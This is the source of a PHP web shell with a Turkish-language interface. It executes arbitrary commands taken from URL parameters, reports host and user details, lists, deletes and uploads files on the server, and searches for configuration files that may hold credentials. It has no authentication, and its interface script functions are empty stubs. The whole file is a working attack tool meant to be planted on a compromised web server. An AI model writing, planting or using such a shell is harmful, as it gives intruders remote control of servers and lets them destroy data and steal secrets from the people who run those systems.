<?php
$phpversion = getPHPVersion();
$host = getHost() . ":" . getPort();
$username = execCommand("uname -a");
$userid = execCommand("id");
$pwd = pwd();
$activeForm = getURLVar('activeForm');

function getURLVar($var) {
    return isset($_GET[$var]) ? $_GET[$var] : null;
}
function execCommand($command) {
    return shell_exec($command);
}
function pwd() {
    return execCommand("pwd");
}
function getPort() {
    return isset($_SERVER['SERVER_PORT']) ? $_SERVER['SERVER_PORT'] : 'UnknownPort';
}
function getHost() {
    return isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : 'UnknownHost';
}
function getPHPVersion() {
    if (isset($_SERVER['SERVER_SOFTWARE'])) {
        return $_SERVER['SERVER_SOFTWARE'];
    } else {
        return 'UnknownServSoftware';
    }
}

if (getURLVar("action") == "command" && getURLVar("command")) {
    $commandOutput = execCommand(getURLVar("command"));
}

if (getURLVar("action") == "manageFile") {
    $directory = getURLVar("directory") ? getURLVar("directory") : ".";
    $commandOutput = execCommand("ls -la " . $directory);
    $fileArray = preg_split('/\s+/', trim($commandOutput));
    array_splice($fileArray, 0, 2);

    $completeArray = [];
    $keys = ['permissions', 'links', 'owner', 'group', 'size', 'month', 'day', 'time', 'name'];
    
    for ($i = 0; $i < count($fileArray); $i += 9) {
        $fileDetails = array_slice($fileArray, $i, 9);
        if (count($fileDetails) == 9) {
            $fileAssocArray = array_combine($keys, $fileDetails);
            $completeArray[] = $fileAssocArray;
        }
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['deletedFileName'])) {
    $filePath = $_POST['deletedFileName'];
    $filePerm = $_POST['deletedFilePerm'];
    if (strpos($filePerm, 'd') === 0) {
        $deleteCommand = "rm -rf $filePath";
    } else {
        $deleteCommand = "rm $filePath";
    }
    shell_exec($deleteCommand);
}

if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST["action"]) && $_POST["action"] == "submit") {
    if (isset($_FILES["file"]) && $_FILES["file"]["error"] == UPLOAD_ERR_OK) {
        move_uploaded_file($_FILES["file"]["tmp_name"], rtrim($pwd) . '/' . basename($_FILES["file"]["name"]));
    }
}

if (getURLVar("action") == "findConf") {
    $directory = getURLVar("directory") ? getURLVar("directory") : ".";
    $commandOutput = execCommand("find " . $directory . " -name '*.cfg' -o -name '*.conf' -o -name '*.cnf'");
}

if (getURLVar("action") == "findFile") {
    $directory = getURLVar("directory") ? getURLVar("directory") : ".";
    $file = getURLVar("file") ? getURLVar("file") : "*";
    $commandOutput = execCommand("find " . $directory . " -name ".$file);
}
?>

<div class="info">
    <label class="hostnameLabel">Host: <?php echo $host ?></label><br></br>
    <label for="phpVersion">PHP Versiyonu: <?php echo $phpversion ?></label><br></br>
    <label id="username">Kullanıcı Adı: <?php echo $username ?></label><br></br>
    <label id="userID">Kullanıcı ID: <?php echo $userid ?></label><br></br>
    <label id="pwd">Bulunan Dizin: <?php echo $pwd ?></label><br></br>
</div>

<button id="showFormBtn" onclick="showExec()">Komut Çalıştır</button>
<button id="showFormBtn" onclick="showFileManage()">Dosya Yönetimi</button>
<button id="showFormBtn" onclick="showFindConf()">Konfigurasyon Dosyası Bul</button>
<button id="showFormBtn" onclick="showFindFile()">Dosya Bul</button>
<button id="showFormBtn" onclick="showHelp()">?</button>

<form id="formExec" method="GET">
    <input hidden value="command" name="action">
    <input hidden value="formExec" name="activeForm">
    <input type="text" placeholder="Komut" name="command">
    <input type="submit" value="Exec">
    <textarea id="execOutput" readonly><?php echo isset($commandOutput) ? $commandOutput : '' ?></textarea>
</form>

<form id="formFileManage" method="GET">
    <input hidden value="manageFile" name="action">
    <input hidden value="formFileManage" name="activeForm">
    <input type="text" placeholder=Dizin name="directory">
    <button id="showFiles">Dosyaları Göster</button>
</form>
<form id="formUploadFile" method="POST" enctype="multipart/form-data">
    <input hidden value="submit" name="action">
    <input type="file" name="file">
    <input type="submit" value="Submit">
</form>
<?php if ($activeForm == "formFileManage" && !empty($completeArray)) : ?>
    <div id="fileList">
        <h3>Dosya Listesi:</h3>
        <ul>
            <?php foreach ($completeArray as $fileDetails) : ?>
                <li>
                    <?php if (strpos($fileDetails['permissions'], 'd') === 0): ?>
                        <strong>Dosya Adı:</strong>
                        <a href="?action=manageFile&activeForm=formFileManage&directory=<?php echo $directory?>/<?php echo $fileDetails['name']; ?>">
                            <?php echo $fileDetails['name']; ?>
                        </a><br>
                    <?php else: ?>
                        <strong>Dosya Adı:</strong> <?php echo $fileDetails['name']; ?><br>
                    <?php endif; ?>
                    <strong>İzinler:</strong> <?php echo $fileDetails['permissions']; ?><br>
                    <strong>Sahip:</strong> <?php echo $fileDetails['owner']; ?><br>
                    <strong>Grup:</strong> <?php echo $fileDetails['group']; ?><br>
                    <form id="formDeleteFile" method="POST">
                        <input type="hidden" name="deletedFileName" value="<?php echo $directory?>/<?php echo $fileDetails['name']; ?>">
                        <input type="hidden" name="deletedFilePerm" value="<?php echo $fileDetails['permissions']; ?>">
                        <button id="deleteFile">Dosyayı Sil</button>
                    </form>
                </li>
                <hr>
            <?php endforeach; ?>
        </ul>
    </div>
<?php endif; ?>

<form id="formFindConf" method="GET">
    <input hidden value="findConf" name="action">
    <input hidden value="formFindConf" name="activeForm">
    <input type="text" placeholder="Dizin" name="directory">
    <input type="submit" value="Ara">
    <textarea id="execOutput" readonly><?php echo isset($commandOutput) ? $commandOutput : '' ?></textarea>
</form>

<form id="formfindFile" method="GET">
    <input hidden value="findFile" name="action">
    <input hidden value="formfindFile" name="activeForm">
    <input type="text" placeholder="Dosya Adı" name="file">
    <input type="text" placeholder="Dizin Adı" name="directory">
    <input type="submit" value="Ara">
    <textarea id="execOutput" readonly><?php echo isset($commandOutput) ? $commandOutput : '' ?></textarea>
</form>

<form id="formHelp" method="GET">
    <input hidden value="help" name="action">
    <input hidden value="formHelp" name="activeForm">
    <input type="text" placeholder="Komut" name="command">
    <input type="submit" value="Exec">
</form>

<script>
function showExec() {
    
}

function showFileManage() {
    
}

function showFindConf() {
    
}

function showFindFile() {
    
}

function showHelp() {
    
}
</script>
